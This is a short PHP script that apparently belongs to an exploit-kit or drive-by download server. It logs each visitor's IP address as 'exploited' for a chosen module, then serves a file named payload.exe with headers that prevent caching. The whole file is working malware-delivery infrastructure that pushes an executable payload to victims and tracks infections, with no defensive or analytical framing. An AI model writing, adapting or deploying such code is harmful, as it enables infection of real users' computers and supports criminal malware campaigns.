<?php
include_once('config.php');
include_once('include/sql.php');
include_once('include/visitors.php');

$page = $_GET["e"];

$pos = strpos($page, "..");


if($page != "" && isset($page) && $pos === false ){
	$inc = "modules/" . $page . ".php";
	
	if(file_exists($inc)){
		
		$sql = new CSQL($sqlSettings);
		$sql->open();	
		$cvisitors = new CVisitors($sql, $sqlSettings);
		$cvisitors->setVisitorExploited($cvisitors->getIpAddr(), $page);
		$sql->close();

		$file_data = @file_get_contents("payload.exe");
		header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
		header("Cache-Control: no-cache");
		header("Pragma: no-cache");
		header("Accept-Ranges: bytes\r\n");
		header("Content-Length: " . strlen($file_data) . "\r\n");
		header("Content-Disposition: inline; filename=payload.exe");
		header("\r\n");
		header("Content-Type: application/octet-stream\r\n\r\n");
		echo $file_data;	
	}else{
		
		exit();
	}

}else{
	
	exit();

}
?>
